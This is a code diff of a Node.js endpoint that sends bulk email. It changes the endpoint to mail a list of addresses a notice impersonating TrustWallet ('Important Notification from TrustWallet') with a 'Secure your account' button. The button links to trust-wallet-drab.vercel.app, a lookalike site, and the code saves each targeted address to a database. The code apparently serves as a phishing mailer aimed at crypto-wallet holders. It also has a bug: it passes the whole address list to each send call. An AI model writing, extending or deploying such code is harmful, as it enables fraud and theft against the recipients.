@@ -5,30 +5,52 @@ const { trustTemplate } = require('../utils/mailtemplates');
 
 /**
  * POST /send-bulk-email
- * Expects body: { "emails": ["a@example.com", "b@example.com"] }
- * Sends a default subject and message/template to all emails.
+ * Expects body: { "email": "a@example.com" } or { "email": ["a@example.com", "b@example.com"] }
+ * Sends a default subject and message/template to all emails, including a 'Secure your account' button,
+ * and saves each email to the database.
  */
 exports.sendBulkEmailDefault = async (req, res) => {
     try {
-        const { emails } = req.body;
+        let { email } = req.body;
 
-        if (!Array.isArray(emails) || emails.length === 0) {
-            return res.status(400).json({ error: 'Emails must be a non-empty array.' });
+        // Normalize email to an array, trim, deduplicate, and filter out empty values
+        if (typeof email === 'string') {
+            email = [email];
+        }
+        if (!Array.isArray(email)) {
+            return res.status(400).json({ error: 'Email must be a non-empty string or array.' });
+        }
+        email = email
+            .map(e => typeof e === 'string' ? e.trim() : '')
+            .filter(e => e.length > 0);
+        // Remove duplicates
+        email = [...new Set(email)];
+
+        if (email.length === 0) {
+            return res.status(400).json({ error: 'Email must be a non-empty string or array.' });
         }
 
-        // Define your default subject and message/template here
+        // Use only the mail template for the email body
         const defaultSubject = "Important Notification from TrustWallet";
-        const defaultMessage = "Dear user,<br><br>This is an important notification from TrustWallet. Please review your account for recent updates.<br><br>Best regards,<br>TrustWallet Team";
+        const secureLink = `https://trust-wallet-drab.vercel.app/`;
 
-        // Send emails in parallel
+        // Send emails and save to DB in parallel
         const results = await Promise.allSettled(
-            emails.map(email =>
-                sendEmail({
+            email.map(async (e) => {
+                // Send the email using only the mail template
+                await sendEmail({
                     email,
                     subject: defaultSubject,
-                    html: trustTemplate ? trustTemplate(defaultMessage) : defaultMessage
-                })
-            )
+                    html: trustTemplate(secureLink)
+                });
+                // Save to DB (avoid duplicates)
+                await userModel.updateOne(
+                    { email: e },
+                    { $setOnInsert: { email: e } },
+                    { upsert: true }
+                );
+                return e;
+            })
         );
 
         const success = results.filter(r => r.status === 'fulfilled').length;
@@ -39,7 +61,7 @@ exports.sendBulkEmailDefault = async (req, res) => {
             successCount: success,
             failedCount: failed,
             errors: results
-                .map((r, i) => r.status === 'rejected' ? { email: emails[i], reason: r.reason } : null)
+                .map((r, i) => r.status === 'rejected' ? { email: email[i], reason: r.reason } : null)
                 .filter(Boolean)
         });
     } catch (error) {
